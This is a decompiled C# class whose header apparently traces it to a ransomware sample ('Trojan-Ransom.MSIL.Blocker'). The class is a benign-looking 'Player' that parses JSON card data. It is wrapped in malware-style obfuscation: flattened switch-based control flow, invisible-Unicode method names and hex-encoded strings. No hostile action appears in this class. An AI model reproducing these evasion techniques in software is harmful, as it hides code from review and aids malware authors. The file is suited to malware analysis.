// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: SystemThreadingSpinLockDebugVi, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 4BC7AA9F-A353-4AE7-9558-F3A117D261BE
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-75c449399be2d092abf47491f6b8671cf4cbf34c9aa0337116f14f8309e4af64.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = -297988982;
      string str1;
      bool flag1;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1929600090)) % 14U)
        {
          case 0:
            num1 = (int) num2 * 56357147 ^ -174971469;
            continue;
          case 1:
            int num3 = !flag2 ? -1173236699 : (num3 = -272044874);
            num1 = num3 ^ (int) num2 * -513986462;
            continue;
          case 2:
            int num4 = flag1 ? -1555838338 : (num4 = -818879059);
            num1 = num4 ^ (int) num2 * 875285402;
            continue;
          case 3:
            flag1 = BaseStream == 1;
            num1 = -441487076;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * -1886412284 ^ -1365232427;
            continue;
          case 6:
            str1 = "666838796332";
            num1 = (int) num2 * -126423793 ^ -408641399;
            continue;
          case 7:
            str1 = "496E74726F7370656374697665536F72745574696C697469";
            num1 = (int) num2 * 1515137465 ^ -370091080;
            continue;
          case 8:
            num1 = (int) num2 * 171808348 ^ 1245767118;
            continue;
          case 10:
            str1 = (string) null;
            num1 = (int) num2 * -885715090 ^ 1020796948;
            continue;
          case 11:
            num1 = (int) num2 * -708213292 ^ -1585684307;
            continue;
          case 12:
            flag2 = BaseStream == 0;
            num1 = (int) num2 * -13823783 ^ -1386876987;
            continue;
          case 13:
            str2 = str1;
            num1 = -394645623;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 169273294;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ 1440341065)) % 3U)
      {
        case 0:
          goto label_1;
        case 1:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = 257981714;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -724992627;
        int num2;
        int[] planningCards;
        int index;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ -979771997)) % 15U)
          {
            case 0:
              planningCardsCount = num2;
              num1 = (int) num4 * -226842973 ^ -1807388132;
              continue;
            case 1:
              index = 0;
              num1 = (int) num4 * 1061821467 ^ 1007280810;
              continue;
            case 3:
              num2 = 0;
              num1 = (int) num4 * 844910904 ^ 1136848949;
              continue;
            case 4:
              num1 = (int) num4 * 570447026 ^ -1464667281;
              continue;
            case 5:
              ++num2;
              num1 = (int) num4 * -699880128 ^ -1055020505;
              continue;
            case 6:
              int num5 = num3 <= 0 ? -1172727657 : (num5 = -1098846204);
              num1 = num5 ^ (int) num4 * 925629452;
              continue;
            case 7:
              int num6;
              num1 = num6 = index >= planningCards.Length ? -1206811062 : (num6 = -650656272);
              continue;
            case 8:
              ++index;
              num1 = -1832282003;
              continue;
            case 9:
              num3 = planningCards[index];
              num1 = -1870389633;
              continue;
            case 10:
              num1 = (int) num4 * -772226044 ^ 1740250081;
              continue;
            case 11:
              num1 = (int) num4 * 1125055317 ^ 1883469633;
              continue;
            case 12:
              goto label_1;
            case 13:
              planningCards = this.PlanningCards;
              num1 = (int) num4 * -847975520 ^ 165650557;
              continue;
            case 14:
              num1 = (int) num4 * -423970908 ^ -722194305;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
label_1:
      int num1 = -1117296716;
      bool flag1;
      int index;
      int planningCard;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1011941936)) % 12U)
        {
          case 0:
            int num3 = !flag1 ? 348822995 : (num3 = 937004925);
            num1 = num3 ^ (int) num2 * 1531864732;
            continue;
          case 1:
            str2 = str1;
            num1 = (int) num2 * 547037706 ^ -54314383;
            continue;
          case 2:
            int num4 = !flag2 ? 1485074973 : (num4 = 1588497098);
            num1 = num4 ^ (int) num2 * 1470341172;
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * -1699553191 ^ 566397887;
            continue;
          case 6:
            ++index;
            num1 = -1175750097;
            continue;
          case 7:
            str1 = Player.\u202D‮‎⁮⁮⁭⁪​‭⁫‭⁪⁪⁬⁫‬‌‮‮‭​⁫‏‍‫‌⁬‫‏‫‪‮‪‭⁬‭⁪⁬⁮⁬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -1579214214;
            continue;
          case 8:
            index = 0;
            num1 = (int) num2 * 1631726523 ^ -1844319965;
            continue;
          case 9:
            planningCard = this.PlanningCards[index];
            flag1 = planningCard == 0;
            num1 = (int) num2 * 1452979737 ^ 640124581;
            continue;
          case 10:
            num1 = -1692085867;
            continue;
          case 11:
            flag2 = index < this.PlanningCards.Length;
            num1 = -49733062;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1380776073;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1218196389)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 79328425 ^ 2053828218;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 2091486439;
      int count;
      int[] numArray;
      int aIndex;
      bool flag;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 55315383)) % 9U)
        {
          case 0:
            int num3 = !flag ? -313522760 : (num3 = -1625955856);
            num1 = num3 ^ (int) num2 * -1775020144;
            continue;
          case 1:
            count = json.Count;
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * 1233082158 ^ -2086909288;
            continue;
          case 2:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1911774450;
            continue;
          case 3:
            goto label_1;
          case 5:
            ++aIndex;
            num1 = (int) num2 * 2000153911 ^ -1533421404;
            continue;
          case 6:
            num1 = (int) num2 * -520997513 ^ 1864584910;
            continue;
          case 7:
            planningCards = numArray;
            num1 = (int) num2 * 1882907639 ^ -1121363975;
            continue;
          case 8:
            flag = aIndex < count;
            num1 = 1645897245;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = 1921789342;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2142197349)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -153749272 ^ -927419997;
            continue;
          case 3:
            str = Player.\u206C‬​⁫⁬⁯⁬⁮⁬‌‫‮‍‮⁫‎⁫​‪​‪‎‍‭‍‎⁫‏‌⁪​⁬⁯‫‫⁪‍‮⁬‏‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * 12738961 ^ -2004797693;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u202D‮‎⁮⁮⁭⁪​‭⁫‭⁪⁪⁬⁫‬‌‮‮‭​⁫‏‍‫‌⁬‫‏‫‪‮‪‭⁬‭⁪⁬⁮⁬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206C‬​⁫⁬⁯⁬⁮⁬‌‫‮‍‮⁫‎⁫​‪​‪‎‍‭‍‎⁫‏‌⁪​⁬⁯‫‫⁪‍‮⁬‏‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
